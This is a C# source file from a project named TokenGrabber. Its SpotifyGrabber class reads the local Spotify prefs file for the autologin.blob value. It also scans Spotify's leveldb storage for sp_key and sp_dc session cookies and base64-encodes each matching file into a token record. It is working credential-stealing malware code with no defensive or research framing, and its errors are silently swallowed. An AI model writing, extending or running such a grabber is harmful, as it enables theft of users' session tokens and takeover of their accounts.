namespace TokenGrabber.Grabbers;

using System.Text.Json;
using TokenGrabber.Models;

internal sealed class SpotifyGrabber : ITokenGrabber
{
    private static readonly string SpotifyPrefsPath = Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
        "Spotify", "prefs");

    private static readonly string SpotifyLocalStorage = Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
        "Spotify", "Local Storage", "leveldb");

    public List<GrabbedToken> Extract()
    {
        var tokens = new List<GrabbedToken>();

        ExtractFromPrefs(tokens);
        ExtractFromLocalStorage(tokens);

        return tokens;
    }

    private static void ExtractFromPrefs(List<GrabbedToken> tokens)
    {
        if (!File.Exists(SpotifyPrefsPath)) return;

        var lines = File.ReadAllLines(SpotifyPrefsPath);
        foreach (var line in lines)
        {
            if (!line.Contains("autologin.blob", StringComparison.OrdinalIgnoreCase)) continue;

            var value = line.Split('=', 2).LastOrDefault()?.Trim().Trim('"') ?? "";
            if (!string.IsNullOrEmpty(value))
            {
                tokens.Add(new GrabbedToken
                {
                    Token = value,
                    Platform = "Spotify",
                    Source = "prefs/autologin.blob",
                    ExtractedAt = DateTime.UtcNow
                });
            }
        }
    }

    private static void ExtractFromLocalStorage(List<GrabbedToken> tokens)
    {
        if (!Directory.Exists(SpotifyLocalStorage)) return;

        var ldbFiles = Directory.GetFiles(SpotifyLocalStorage, "*.ldb");
        foreach (var file in ldbFiles)
        {
            try
            {
                var content = File.ReadAllText(file);
                if (content.Contains("sp_key") || content.Contains("sp_dc"))
                {
                    tokens.Add(new GrabbedToken
                    {
                        Token = Convert.ToBase64String(File.ReadAllBytes(file)),
                        Platform = "Spotify",
                        Source = Path.GetFileName(file),
                        ExtractedAt = DateTime.UtcNow
                    });
                }
            }
            catch { }
        }
    }
}
